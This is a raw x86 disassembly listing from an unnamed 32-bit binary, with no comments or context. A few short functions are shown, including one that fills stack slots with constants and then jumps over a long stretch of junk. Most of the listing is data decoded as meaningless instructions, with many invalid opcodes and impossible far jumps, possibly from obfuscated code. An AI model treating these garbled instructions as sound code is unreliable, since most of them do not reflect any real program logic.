  41408e:	ja     0x414024
  414090:	aad    0x10
  414092:	cmp    BYTE PTR [esi+0x4f4c5656],dl
  414098:	aam    0x24
  41409a:	(bad)  
  41409b:	sti    
  41409c:	fild   QWORD PTR [ecx-0x2b]
  41409f:	mov    eax,ds:0x574e9e54
  4140a4:	sub    ecx,edx
  4140a6:	push   ebp
  4140a7:	sbb    BYTE PTR [eax-0x58],0xe1
  4140ab:	mov    al,0xb0
  4140ad:	sub    BYTE PTR [ebx-0x248320b4],bh
  4140b3:	or     BYTE PTR [edi+0x4995d3d8],0xa0
  4140ba:	sahf   
  4140bb:	mov    dl,0xb5
  4140bd:	in     eax,0x9
  4140bf:	(bad)  
  4140c0:	(bad)  
  4140c2:	nop    DWORD PTR [ecx]
  4140c5:	push   edi
  4140c6:	mov    DWORD PTR [ebp-0x3c],esi
  4140c9:	mov    eax,DWORD PTR [ebp-0x48]
  4140cc:	mov    ecx,DWORD PTR [ebp-0x44]
  4140cf:	push   0xae0404d3
  4140d4:	push   ecx
  4140d5:	push   eax
  4140d6:	call   0x42206a
  4140db:	mov    ecx,eax
  4140dd:	mov    eax,DWORD PTR [ebp-0x50]
  4140e0:	mov    esi,DWORD PTR [ebp-0x4c]
  4140e3:	or     ecx,eax
  4140e5:	mov    eax,DWORD PTR [ebp-0x40]
  4140e8:	or     edx,esi
  4140ea:	mov    esi,DWORD PTR [ebp-0x3c]
  4140ed:	add    ecx,eax
  4140ef:	mov    eax,DWORD PTR [ebp-0x58]
  4140f2:	adc    edx,esi
  4140f4:	mov    esi,DWORD PTR [ebp-0x54]
  4140f7:	add    ecx,eax
  4140f9:	mov    eax,DWORD PTR [ebp+0x8]
  4140fc:	adc    edx,esi
  4140fe:	add    ecx,0xffff55a8
  414104:	pop    edi
  414105:	adc    edx,0xffff64cd
  41410b:	pop    esi
  41410c:	mov    DWORD PTR [eax],ecx
  41410e:	mov    DWORD PTR [eax+0x4],edx
  414111:	pop    ebx
  414112:	leave  
  414113:	ret    0x8
  414116:	push   ebp
  414117:	mov    ebp,esp
  414119:	sub    esp,0x3c
  41411c:	mov    DWORD PTR [ebp-0x20],0x3510
  414123:	mov    DWORD PTR [ebp-0x1c],0x2104
  41412a:	mov    DWORD PTR [ebp-0x18],0x5d15
  414131:	mov    DWORD PTR [ebp-0x14],0x30cd
  414138:	mov    DWORD PTR [ebp-0x10],0x1709
  41413f:	mov    DWORD PTR [ebp-0xc],0x260b
  414146:	jmp    0x41450b
  41414b:	jnp    0x4140ce
  41414d:	xlat   BYTE PTR ds:[ebx]
  41414e:	dec    edi
  41414f:	sar    DWORD PTR [edi],cl
  414151:	jnp    0x414190
  414153:	add    DWORD PTR [ebx],edx
  414155:	lds    edi,FWORD PTR [ebp+eax*1+0x62]
  414159:	shl    DWORD PTR [eax+0x1a],1
  41415c:	sub    al,0x18
  41415e:	sbb    al,dl
  414160:	adc    bl,BYTE PTR [eax]
  414162:	sbb    BYTE PTR [edi],cl
  414164:	cmp    bh,ch
  414166:	xor    BYTE PTR [ebp+0x28],dh
  414169:	shl    DWORD PTR [ebx],cl
  41416b:	pop    es
  41416c:	repnz stos BYTE PTR es:[edi],al
  41416e:	mov    eax,ds:0xf0401d8e
  414173:	jmp    0x414104
  414175:	mov    bl,0x8a
  414177:	repz inc ebx
  414179:	jl     0x414185
  41417b:	test   DWORD PTR [ecx],ebp
  41417d:	bound  ebp,QWORD PTR [eax]
  41417f:	cwde   
  414180:	aad    0xd
  414182:	inc    esp
  414183:	lods   al,BYTE PTR ds:[esi]
  414184:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414185:	in     al,0x8f
  414187:	fdiv   DWORD PTR [ebx+ebp*8+0x3ef5904c]
  41418e:	loop   0x4141f9
  414190:	(bad)  
  414191:	retf   
  414192:	loopne 0x414117
  414194:	pop    edi
  414195:	xchg   edx,eax
  414196:	sub    eax,0xf0b7175d
  41419b:	xlat   BYTE PTR ds:[ebx]
  41419c:	jge    0x414219
  41419e:	push   edx
  41419f:	mov    ebx,0x634cf7e0
  4141a4:	mov    edi,0x968c8505
  4141a9:	pop    ss
  4141aa:	(bad)  
  4141ab:	pop    ds
  4141ac:	push   cs
  4141ad:	test   al,0xb1
  4141af:	cwde   
  4141b0:	pop    ebp
  4141b1:	hlt    
  4141b2:	jae    0x41418c
  4141b4:	lods   eax,DWORD PTR ds:[esi]
  4141b5:	in     eax,dx
  4141b6:	add    bl,al
  4141b8:	outs   dx,DWORD PTR ds:[esi]
  4141b9:	pop    edx
  4141ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141bb:	mov    al,0x1
  4141bd:	mov    WORD PTR [ebx],fs
  4141bf:	mov    ds:0x51e06e71,eax
  4141c4:	pop    edx
  4141c5:	loopne 0x4141db
  4141c7:	fst    QWORD PTR [edx-0x12552356]
  4141cd:	jae    0x4141f8
  4141cf:	je     0x4141c3
  4141d1:	xor    al,0x77
  4141d3:	sub    al,0xb6
  4141d5:	pop    esp
  4141d6:	sbb    DWORD PTR [esi-0x1c],0xcfc03ff9
  4141dd:	mov    ds:0x97687e0d,al
  4141e2:	xrelease xchg DWORD PTR [edx+edx*8+0x2c882acb],esi
  4141ea:	hlt    
  4141eb:	bnd jg 0x41422d
  4141ee:	and    dh,BYTE PTR [ecx+0x7e55a07d]
  4141f4:	mov    dl,0x9d
  4141f6:	pop    esp
  4141f7:	mov    dl,ch
  4141f9:	sbb    BYTE PTR [eax],0x80
  4141fc:	xchg   DWORD PTR [ebp-0x5e238fa6],esi
  414202:	(bad)  cs:[esi-0x13d62898]
  414209:	jb     0x4141d3
  41420b:	adc    DWORD PTR [ebx+0x65287bc3],esi
  414211:	or     al,0x16
  414213:	hlt    
  414214:	rcl    BYTE PTR [ecx+esi*2-0x31f84da5],0xfc
  41421c:	repnz xchg edx,eax
  41421e:	jmp    0x4721af25
  414223:	sub    ah,al
  414225:	cmp    eax,0x1a76a2fb
  41422a:	sub    al,0xdc
  41422c:	stc    
  41422d:	or     al,0x75
  41422f:	test   DWORD PTR [eax+0x2caf7ac1],eax
  414235:	cmp    DWORD PTR [ecx-0x38],esp
  414238:	jmp    0x8182:0xd715cf8f
  41423f:	cmc    
  414240:	pop    ebp
  414241:	es mov edi,0x184a3ad9
  414247:	xor    esp,DWORD PTR [ecx+eiz*1]
  41424a:	pop    eax
  41424b:	sub    BYTE PTR [ebp-0x2f],ch
  41424e:	(bad)  
  41424f:	ficom  WORD PTR [ebx]
  414251:	and    DWORD PTR [esi+0x6d973a36],eax
  414257:	in     al,dx
  414258:	push   esi
  414259:	shl    BYTE PTR [edi+0x126b839c],0x46
  414260:	jmp    0x106a840
  414265:	push   ebx
  414266:	loopne 0x41423b
  414268:	sub    eax,0x685634c1
  41426d:	sahf   
  41426e:	daa    
  41426f:	fcom   QWORD PTR [eax-0x3b1eed83]
  414275:	shl    BYTE PTR [ecx],cl
  414277:	jne    0x509cfe77
  41427d:	and    BYTE PTR [ebp-0x1fbfb17d],0xd1
  414284:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414285:	repz or dh,BYTE PTR [edx+esi*8+0x1eab8f8e]
  41428d:	inc    eax
  41428e:	imul   edx,DWORD PTR [ecx+0x15],0x2b
  414292:	inc    edi
  414293:	je     0x41429e
  414295:	inc    ecx
  414296:	mov    edx,0x572a7a8
  41429b:	loopne 0x414247
  41429d:	aad    0xad
  41429f:	(bad)  
  4142a0:	cld    
  4142a1:	pushf  
  4142a2:	inc    esi
  4142a3:	fdivrp st(4),st
  4142a5:	addr16 popf 
  4142a7:	addr16 daa 
  4142a9:	jmp    0x4359:0xca050ff2
  4142b0:	ds popa 
  4142b2:	je     0x41428c
  4142b4:	xchg   BYTE PTR [edx],cl
  4142b6:	and    eax,0x2b85f29e
  4142bb:	pop    ds
  4142bc:	xor    BYTE PTR [edx+0x4c],al
  4142bf:	popa   
  4142c0:	adc    ebp,DWORD PTR [eax+0x3f]
  4142c3:	lock out dx,eax
  4142c5:	test   edi,esp
  4142c7:	(bad)  
  4142c8:	adc    BYTE PTR [edx-0x25e769f4],ah
  4142ce:	jmp    0xda4e43b6
  4142d3:	xchg   esp,eax
  4142d4:	cwde   
  4142d5:	mov    DWORD PTR [ebx],esi
  4142d7:	mov    bh,ah
  4142d9:	push   esi
  4142da:	jmp    0x4142e7
  4142dc:	xor    dl,al
  4142de:	mov    esi,0x583d1b19
  4142e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142e4:	(bad)  [ebx]
  4142e6:	call   0x2086:0x891a6e18
  4142ed:	dec    esp
  4142ee:	ins    DWORD PTR es:[edi],dx
  4142ef:	clc    
  4142f0:	ins    BYTE PTR es:[edi],dx
  4142f1:	in     eax,dx
  4142f2:	fs mov al,0xcd
  4142f5:	xor    al,0xdf
  4142f7:	jge    0x414290
  4142f9:	jo     0x414352
  4142fb:	ja     0x41435e
  4142fd:	xchg   ebx,eax
  4142fe:	nop
  4142ff:	shl    BYTE PTR [ebx+0x70bac8ae],0xa9
  414306:	mov    edx,0xe0b8c5f9
  41430b:	sbb    bh,cl
  41430d:	icebp  
  41430e:	push   0xd9b5eae6
  414313:	outs   dx,BYTE PTR ds:[esi]
  414314:	pop    esp
  414315:	add    eax,0xdeaad151
  41431a:	lahf   
  41431b:	inc    esi
  41431c:	add    al,0x35
  41431e:	add    al,bl
  414320:	lea    edi,[ebp+0x3d907690]
  414326:	inc    esi
  414327:	cmp    al,0x2c
  414329:	mov    ds,WORD PTR [ebx]
  41432b:	pop    esp
  41432c:	xor    BYTE PTR [ecx+0x69f863f7],bl
  414332:	and    esi,esi
  414334:	(bad)  
  414335:	mov    dh,0x42
  414337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414338:	icebp  
  414339:	ds xchg ebp,edx
  41433c:	mov    cl,0x6f
  41433e:	int    0xeb
  414340:	ja     0x4142de
  414342:	aam    0x55
  414344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414345:	and    ebp,edi
  414347:	push   ecx
  414348:	scas   eax,DWORD PTR es:[edi]
  414349:	sbb    bl,bh
  41434b:	adc    ch,cl
  41434d:	xor    eax,0xf00bac0d
  414352:	push   esi
  414353:	mov    dl,0x53
  414355:	inc    BYTE PTR [esi-0x31ba44fe]
  41435b:	fist   WORD PTR [eax+0x69fc76c0]
  414361:	push   ss
  414362:	daa    
  414363:	push   ss
  414364:	xor    bl,al
  414366:	jge    0x4143bd
  414368:	lods   al,BYTE PTR ds:[esi]
  414369:	(bad)  
  41436b:	mov    bl,BYTE PTR [esi+0x1dcf04da]
  414371:	adc    cl,BYTE PTR [ecx+0x327dc856]
  414377:	sbb    DWORD PTR [esi+0x75],edx
  41437a:	aaa    
  41437b:	or     DWORD PTR [edi+ebx*4+0x585b6b7b],esp
  414382:	pop    esp
  414383:	ret    0xb43a
  414386:	or     eax,0x628f6a24
  41438b:	jmp    0xefec:0x85d09094
  414392:	rol    BYTE PTR [ebx],1
  414394:	xchg   esp,eax
  414395:	cmp    DWORD PTR [ecx+0x3ce17203],eax
  41439b:	addr16 mov edi,0xa876a5c3
  4143a1:	ror    BYTE PTR [esi+edi*4],cl
  4143a4:	push   0xffffff8e
  4143a6:	mov    DWORD PTR [ebx-0x3e],eax
  4143a9:	push   0xffffff8a
  4143ab:	test   BYTE PTR ds:0xa0a8e71,0x51
  4143b2:	ds je  0x4143d8
  4143b5:	sbb    BYTE PTR [edx+0x25],ah
  4143b8:	out    dx,al
  4143b9:	sbb    esp,edx
  4143bb:	stos   DWORD PTR es:[edi],eax
  4143bc:	mov    WORD PTR [ebp+0x68916dba],ss
  4143c2:	sahf   
  4143c3:	daa    
  4143c4:	les    esp,FWORD PTR [ecx]
  4143c6:	into   
  4143c7:	sbb    eax,0x603a13e2
  4143cc:	or     DWORD PTR [eax],ebx
  4143ce:	imul   ecx,edi,0xffffff9a
  4143d1:	or     DWORD PTR [edx+0x40673dd6],0xb5ded91d
  4143db:	xchg   esi,eax
  4143dc:	pop    edx
  4143dd:	fs push eax
  4143df:	jmp    0x209b3149
  4143e4:	pop    esp
  4143e5:	stos   DWORD PTR es:[edi],eax
  4143e6:	fst    QWORD PTR [ebp+0x10]
  4143e9:	cwde   
  4143ea:	stos   DWORD PTR es:[edi],eax
  4143eb:	push   ebx
  4143ec:	mov    edx,0xc828f1bb
  4143f1:	jo     0x414397
  4143f3:	or     edx,DWORD PTR [edx]
  4143f5:	fs clc 
  4143f7:	dec    esi
  4143f8:	mov    edx,DWORD PTR [esi+0x51]
  4143fb:	addr16 stc 
  4143fd:	jb     0x414464
  4143ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414400:	mov    dh,0xf9
  414402:	(bad)  
  414403:	mov    ebx,0xd4ef8004
  414408:	xchg   esp,eax
  414409:	fidiv  WORD PTR ds:0x870a145
  41440f:	cmp    cl,BYTE PTR [ebp+esi*1-0x60a1c82e]
  414416:	push   edx
  414417:	add    bl,BYTE PTR [edx-0x21]
  41441a:	popa   
  41441b:	ss xor eax,0xfa1e43b7
  414421:	cs push eax
  414423:	cmp    esi,DWORD PTR [ecx+0x768d828d]
  414429:	inc    ebx
  41442a:	mov    ebx,0x35fc95cb
  41442f:	pop    edx
  414430:	mov    ds:0x8eeea0d7,eax
  414435:	push   0x3086d710
  41443a:	jp     0x41443e
  41443c:	cdq    
  41443d:	repnz and eax,DWORD PTR [ebp+0x54]
  414441:	mov    bl,0x6a
  414443:	in     al,dx
  414444:	xor    dl,dl
  414446:	into   
  414447:	and    al,0xb0
  414449:	test   al,0xeb
  41444b:	pop    ebp
  41444c:	sub    al,0xe7
  41444e:	aad    0xa9
  414450:	js     0x414489
  414452:	jne    0x4144ba
  414454:	jmp    0x414446
  414456:	jp     0x414434
  414458:	and    eax,0xd89931e5
  41445d:	and    eax,0x59ea4a43
  414462:	ins    BYTE PTR es:[edi],dx
  414463:	xor    dh,BYTE PTR [ebp-0x74]
  414466:	lods   al,BYTE PTR ds:[esi]
  414467:	jns    0x414416
  414469:	out    dx,eax
  41446a:	test   DWORD PTR [ecx-0x7b],ebx
  41446d:	xor    DWORD PTR [esi-0x1],esi
  414470:	inc    esp
  414471:	xlat   BYTE PTR ds:[ebx]
  414472:	in     al,0xf4
  414474:	imul   edi,DWORD PTR [eax-0x13e06fd7],0xfffffff4
  41447b:	fcmovnu st,st(6)
  41447d:	xor    al,0xe8
  41447f:	sub    al,0x6b
  414481:	mov    ebp,0x86f5d1c2
  414486:	cmp    DWORD PTR [ebp-0x469d5798],esp
  41448c:	push   esi
  41448d:	(bad)  
  41448e:	out    dx,eax
  41448f:	inc    edi
  414490:	and    bh,0x98
  414493:	aad    0xc3
  414495:	or     ecx,edx
  414497:	pop    ebp
  414498:	mov    ch,0x8f
  41449a:	pop    eax
  41449b:	push   edi
  41449c:	xchg   ebp,eax
  41449d:	int3   
  41449e:	add    DWORD PTR [ecx+edi*1-0x4423373e],edi
  4144a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144a6:	test   DWORD PTR [esp+edi*4-0x4cf6e8cf],ebx
  4144ad:	xchg   ebx,eax
  4144ae:	aas    
  4144af:	mov    al,ds:0x9844fb77
  4144b4:	pop    ss
  4144b5:	test   DWORD PTR [ecx+0x1b],eax
  4144b8:	pop    edi
  4144b9:	or     eax,0x82557d96
  4144be:	(bad)  
  4144bf:	enter  0x7bcd,0x77
  4144c3:	push   edx
  4144c4:	loope  0x4144fc
  4144c6:	sub    eax,0x5932c7db
  4144cb:	pop    ecx
  4144cc:	mov    fs,WORD PTR [ebx-0x73323d1f]
  4144d2:	and    al,0xb1
  4144d4:	adc    bl,BYTE PTR [edx+0x4a]
  4144d7:	jmp    0x5f0afc49
  4144dc:	out    0xe3,al
  4144de:	mov    ebp,0xcb069a7a
  4144e3:	and    BYTE PTR [ebp-0x4b8e99bc],0xd2
  4144ea:	call   0xb3dc2c7b
  4144ef:	xlat   BYTE PTR ds:[ebx]
  4144f0:	xchg   DWORD PTR ds:[edx+0x4],esi
  4144f4:	mov    edx,0xf22bfd60
  4144f9:	mov    edi,0x756e8994
  4144fe:	mov    ebx,0xffd46c9f
  414503:	stos   BYTE PTR es:[edi],al
  414504:	imul   edx,DWORD PTR [edx-0x466d8c25],0x6a
  41450b:	mov    DWORD PTR [ebp-0x8],0x3204
  414512:	mov    DWORD PTR [ebp-0x4],0x62ea
  414519:	mov    DWORD PTR [ebp-0x38],0x58e9
  414520:	mov    DWORD PTR [ebp-0x34],0x7f89
  414527:	mov    DWORD PTR [ebp-0x30],0x7fda
  41452e:	mov    DWORD PTR [ebp-0x2c],0x2889
  414535:	mov    DWORD PTR [ebp-0x28],0xf0f
  41453c:	mov    DWORD PTR [ebp-0x24],0x58e1
  414543:	mov    DWORD PTR [ebp-0x3c],0x69c
  41454a:	mov    eax,DWORD PTR [ebp-0x10]
  41454d:	mov    ecx,DWORD PTR [ebp-0x14]
  414550:	and    al,0xb9
  414552:	add    al,cl
  414554:	mov    ecx,DWORD PTR [ebp-0x18]
  414557:	and    al,cl
  414559:	mov    ecx,DWORD PTR [ebp-0x1c]
  41455c:	sub    al,0x11
  41455e:	and    al,cl
  414560:	mov    ecx,DWORD PTR [ebp-0x20]
  414563:	mov    edx,DWORD PTR [ebp+0x8]
  414566:	imul   ecx,ecx,0x6008
  41456c:	add    ecx,0x1759dd6e
  414572:	add    al,0x4d
  414574:	xor    ecx,0x2b4185ee
  41457a:	cmp    BYTE PTR [ecx+edx*1],al
  41457d:	jne    0x414da1
  414583:	jmp    0x414948
  414588:	push   cs
  414589:	mov    WORD PTR [edi],gs
  41458b:	dec    edx
  41458c:	sub    ch,BYTE PTR [edx]
  41458e:	jmp    0x7b7c:0x73623c4c
  414595:	sti    
  414596:	pop    ds
  414597:	jle    0x41456b
  414599:	and    al,0x18
  41459b:	sbb    al,dl
  41459d:	adc    bl,BYTE PTR [eax]
  41459f:	sbb    bh,dh
  4145a1:	sar    BYTE PTR [eax],cl
  4145a3:	div    DWORD PTR [ebx+0x3b]
  4145a6:	xor    ecx,DWORD PTR [edx+0x7]
  4145a9:	lods   al,BYTE PTR ds:[esi]
  4145aa:	shl    ah,cl
  4145ac:	(bad)  
  4145ad:	pop    edx
  4145ae:	sub    DWORD PTR [esi+0x6569c1c2],ebp
  4145b4:	idiv   ah
  4145b6:	mov    es,WORD PTR [ebx+0x1a]
  4145b9:	xor    al,0x49
  4145bb:	mov    cl,BYTE PTR [esi+0x20]
  4145be:	push   cs
  4145bf:	repz mov dl,BYTE PTR [edi+0x16ddbc77]
  4145c6:	imul   ecx,DWORD PTR ds:0x296fe670,0x298402f9
  4145d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145d1:	lea    esp,[edi]
  4145d3:	or     BYTE PTR [ecx],al
  4145d5:	mov    eax,cs:0xc83ee647
  4145db:	call   0x5624cb94
  4145e0:	outs   dx,BYTE PTR ds:[esi]
  4145e1:	push   esp
  4145e2:	add    eax,0xcdbbee21
  4145e7:	add    DWORD PTR [edi+0x290cc98d],edi
  4145ed:	xor    DWORD PTR [edi+0x5d],ebx
  4145f0:	push   edi
  4145f1:	mov    DWORD PTR [ebp+0x1],edi
  4145f4:	in     al,0xa6
  4145f6:	fstp   TBYTE PTR [ebx]
  4145f8:	ret    0xd39
  4145fb:	sbb    al,0x58
  4145fd:	cld    
  4145fe:	mov    eax,0x5f9a2fdb
  414603:	pop    esi
  414604:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414605:	arpl   WORD PTR [eax+edx*8+0x1],ax
  414609:	ds in  eax,0xc
  41460c:	push   esp
  41460d:	push   ds
  41460e:	ror    DWORD PTR [esp+eiz*4-0x6a72e7df],1
  414615:	sbb    ah,dh
  414617:	xor    dh,BYTE PTR [ebp-0x80]
  41461a:	lods   al,BYTE PTR ds:[esi]
  41461b:	(bad)  
  41461c:	dec    esp
  41461d:	popa   
  41461e:	or     DWORD PTR [ecx],edx
  414620:	cli    
  414621:	cmp    eax,0xfcb6470a
  414626:	test   eax,0xc4f59fa
  41462b:	jecxz  0x414675
  41462d:	mov    ecx,0x24d3cd5
  414632:	mov    al,ds:0xc45813ae
  414637:	adc    BYTE PTR [esi-0x4ea0433f],bl
  41463d:	dec    ebx
  41463e:	dec    edx
  41463f:	cdq    
  414640:	xchg   esi,eax
  414641:	push   esi
  414642:	push   0xf5a0f7c1
  414647:	add    al,0x75
  414649:	dec    eax
  41464a:	xchg   ecx,eax
  41464b:	mov    dh,dh
  41464d:	push   eax
  41464e:	and    al,0x50
  414650:	mov    ds:0x11c0daa3,al
  414655:	mov    ah,0xa5
  414657:	(bad)  
  414658:	std    
  414659:	(bad)  
  41465a:	ins    DWORD PTR es:[edi],dx
  41465b:	les    ebx,FWORD PTR [ecx-0x5]
  41465e:	sti    
  41465f:	iret   
  414660:	retf   0x899c
  414663:	add    BYTE PTR [edi],0xa5
  414666:	mov    ebx,0x9049e8bc
  41466b:	push   edx
  41466c:	fs jno 0x414689
  41466f:	sbb    edx,ebp
  414671:	fistp  QWORD PTR ds:0x9a28e0b0
  414677:	jg     0x4146b6
  414679:	sub    al,0xab
  41467b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41467c:	push   es
  41467d:	mov    ecx,0x372c1c7a
  414682:	dec    ecx
  414683:	mov    dh,BYTE PTR [ecx]
  414685:	dec    esi
  414686:	cmp    eax,0x536be21c
  41468b:	adc    edi,DWORD PTR [ebx-0x2ca456ed]
  414691:	and    eax,DWORD PTR [ebp-0x73]
  414694:	xchg   ebp,eax
  414695:	repz mov ah,0x36
  414698:	clc    
  414699:	shl    DWORD PTR [ebx+0x4999a283],0xd5
  4146a0:	shr    DWORD PTR [bp+di],0xe0
  4146a4:	mov    esi,0x77d45e28
  4146a9:	lods   al,BYTE PTR ds:[esi]
  4146aa:	sub    eax,DWORD PTR [edx+0x78c86a19]
  4146b0:	push   edx
  4146b1:	jb     0x41469c
  4146b3:	cmc    
  4146b4:	jmp    0x15166635
  4146b9:	jbe    0x414690
  4146bb:	mov    DWORD PTR [edi+esi*2+0x326735d5],ecx
  4146c2:	dec    esi
  4146c3:	inc    ebx
  4146c4:	jne    0x41473c
  4146c6:	scas   al,BYTE PTR es:[edi]
  4146c7:	mov    ebp,?
  4146c9:	js     0x414663
  4146cb:	cld    
  4146cc:	out    0x14,eax
  4146ce:	xor    eax,0xc4657776
  4146d3:	test   eax,0xb5cbe6c2
  4146d8:	loopne 0x4146da
  4146da:	add    bh,BYTE PTR es:0xb43e8ccc
  4146e1:	sbb    BYTE PTR [ecx+0x11],0xc0
  4146e5:	fild   DWORD PTR [edx-0x3ee84b8e]
  4146eb:	jmp    0x284347a1
  4146f0:	lock test BYTE PTR [edi],0x68
  4146f4:	jb     0x414681
  4146f6:	mov    edi,0x6c8393dc
  4146fb:	pop    edi
  4146fc:	sbb    ch,bh
  4146fe:	test   edi,esi
  414700:	pop    ss
  414701:	imul   edx,DWORD PTR ds:0x9182bd20,0xe0b21ae9
  41470b:	int    0xa4
  41470d:	test   BYTE PTR [ebx-0x4f],bl
  414710:	sbb    edi,edi
  414712:	xor    bl,BYTE PTR [ebx-0x9]
  414715:	mov    ebp,0x42f4a85f
  41471a:	iret   
  41471b:	push   eax
  41471c:	cs into 
  41471e:	mov    eax,ds:0x2341a0ca
  414723:	lock fcom DWORD PTR [edi]
  414726:	es jle 0x41473a
  414729:	loope  0x4146f9
  41472b:	mov    BYTE PTR [ecx+0x73b6127f],dh
  414731:	dec    esp
  414732:	repz daa 
  414734:	jmp    0x4146da
  414736:	inc    esi
  414737:	(bad)  
  414738:	lock sub eax,0xed2c2c92
  41473e:	mov    ah,0x98
  414740:	pop    eax
  414741:	retf   0xdef3
  414744:	pop    ss
  414745:	pop    ss
  414746:	pop    eax
  414747:	ins    DWORD PTR es:[edi],dx
  414748:	xor    esp,DWORD PTR [ecx+0x7d929f43]
  41474e:	das    
  41474f:	repnz mov eax,ds:0x475e9841
  414755:	out    dx,al
  414756:	xchg   ebx,eax
  414757:	mov    BYTE PTR [ebp+0x22db1f19],ch
  41475d:	pop    ss
  41475e:	sbb    DWORD PTR [eax+0x57cf7455],esp
  414764:	ja     0x414777
  414766:	jne    0x4147ab
  414768:	mov    edi,0x26abf0b
  41476d:	xlat   BYTE PTR ds:[ebx]
  41476e:	or     DWORD PTR [ecx],edx
  414770:	mov    ds:0x762ed41c,eax
  414775:	gs int 0xef
  414778:	sbb    al,0xf8
  41477a:	cmp    al,BYTE PTR [esi-0x6f52cdee]
  414780:	adc    DWORD PTR [eax+0x40],0xa80c4091
  414787:	add    DWORD PTR [ecx-0x2b],0x151f693e
  41478e:	xchg   edx,eax
  41478f:	xchg   ecx,eax
  414790:	and    ch,BYTE PTR ds:0xeea1172c
  414796:	and    BYTE PTR [edi-0x61],dl
  414799:	ja     0x41471c
  41479b:	loopne 0x414783
  41479d:	push   ds
  41479e:	xor    edx,DWORD PTR [eax-0x5f]
  4147a1:	out    0x19,al
  4147a3:	xchg   esi,eax
  4147a4:	stos   DWORD PTR es:[edi],eax
  4147a5:	inc    ebx
  4147a6:	or     edi,eax
  4147a8:	addr16 ret 
  4147aa:	cmp    dl,al
  4147ac:	imul   esp,DWORD PTR [ecx],0x178a9278
  4147b2:	inc    esi
  4147b3:	sbb    eax,DWORD PTR [eax-0x6b74d801]
  4147b9:	mov    ah,bh
  4147bb:	into   
  4147bc:	mov    cl,0x5f
  4147be:	push   ds
  4147bf:	mov    ds:0x874133c5,al
  4147c4:	loop   0x414828
  4147c6:	rcl    DWORD PTR [edx],1
  4147c8:	popf   
  4147c9:	mov    ch,0xba
  4147cb:	sbb    DWORD PTR ds:0xc1cc9fec,edx
  4147d1:	jnp    0x414830
  4147d3:	stos   DWORD PTR es:[edi],eax
  4147d4:	mov    al,0x1a
  4147d6:	aam    0x26
  4147d8:	dec    edx
  4147d9:	test   ah,dl
  4147db:	mov    eax,0x29f79974
  4147e0:	cmp    DWORD PTR [edi+edi*8],esi
  4147e3:	and    eax,DWORD PTR [ecx]
  4147e5:	shl    BYTE PTR [edx+0x50],cl
  4147e8:	aad    0xd
  4147ea:	add    edx,esi
  4147ec:	in     eax,dx
  4147ed:	loopne 0x414781
  4147ef:	pusha  
  4147f0:	or     ebx,DWORD PTR [ebp+0x34]
  4147f3:	into   
  4147f4:	retf   0x967c
  4147f7:	mov    edx,0x69c03584
  4147fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147fd:	sub    BYTE PTR [eax-0xb69a8de],bl
  414803:	inc    eax
  414804:	or     BYTE PTR [edi+0x5b2696a3],bl
  41480a:	dec    ecx
  41480b:	xchg   edx,eax
  41480c:	data16 aad 0xad
  41480f:	xor    eax,0x7d44f255
  414814:	cs leave 
  414816:	nop
  414817:	jmp    0x762d:0x8046f7e4
  41481e:	nop
  41481f:	pop    ss
  414820:	mov    ch,BYTE PTR [edi+0x71]
  414823:	sti    
  414824:	clc    
  414825:	adc    DWORD PTR cs:[edx-0x2e],ebx
  414829:	sbb    esp,edx
  41482b:	cmp    cl,ah
  41482d:	mov    edx,ss
  41482f:	and    DWORD PTR [ebp-0x725d440d],esp
  414835:	sbb    al,0x87
  414837:	lea    ebx,[ebx]
  414839:	xchg   esp,eax
  41483a:	nop
  41483b:	outs   dx,BYTE PTR ds:[esi]
  41483c:	stc    
  41483d:	aas    
  41483e:	and    al,BYTE PTR [ecx+edi*8+0x46ca2809]
  414845:	jne    0x4148c5
  414847:	sbb    DWORD PTR [ebp+0x1d],edi
  41484a:	jg     0x4147f3
  41484c:	jl     0x4147e3
  41484e:	rol    BYTE PTR [ecx-0x32],cl
  414851:	into   
  414852:	mov    dh,0x31
  414854:	xchg   BYTE PTR [ebp-0x33],cl
  414857:	pushf  
  414858:	call   0xb9ff:0xc67b477
  41485f:	pop    eax
  414860:	cmp    al,0xf2
  414862:	inc    ebp
  414863:	push   esp
  414864:	dec    ebp
  414865:	inc    ebx
  414866:	push   ds
  414867:	pop    ss
  414868:	mov    dh,0x7d
  41486a:	mov    esp,0x2cda9e79
  41486f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414870:	xchg   eax,edi
  414872:	pop    edx
  414873:	call   0x1c122699
  414878:	cmp    BYTE PTR [ebx-0x33],ah
  41487b:	jnp    0x41483d
  41487d:	fild   DWORD PTR [esi]
  41487f:	ret    0x7912
  414882:	out    0x8d,eax
  414884:	(bad)  [eax-0x715c5ace]
  41488a:	inc    ebx
  41488b:	mov    ds,eax
  41488d:	mov    ecx,0x1396ccdc
  414892:	cwde   
  414893:	sahf   
  414894:	cmp    al,0xf9
  414896:	add    al,0xe7
  414898:	in     al,dx
  414899:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41489b:	bound  esi,QWORD PTR [ecx]
  41489d:	lods   eax,DWORD PTR ds:[esi]
  41489e:	fmul   DWORD PTR [eax-0xd]
  4148a1:	cvtpi2ps xmm3,QWORD PTR [esi-0x5e83df6b]
  4148a8:	fnstcw WORD PTR [edx]
  4148aa:	jne    0x414879
  4148ac:	inc    eax
  4148ad:	push   cs
  4148ae:	jnp    0x41488b
  4148b0:	inc    esi
  4148b1:	or     ah,BYTE PTR [esi-0x1fb5ea2a]
  4148b7:	jmp    0xb5b3:0xb36162fc
  4148be:	xlat   BYTE PTR ds:[ebx]
  4148bf:	xor    al,0x7d
  4148c1:	into   
  4148c2:	mov    ds:0x29250933,eax
  4148c7:	dec    ebp
  4148c8:	fwait
  4148c9:	adc    ecx,DWORD PTR [ebp-0x28]
  4148cc:	lock aaa 
  4148ce:	test   al,0x5d
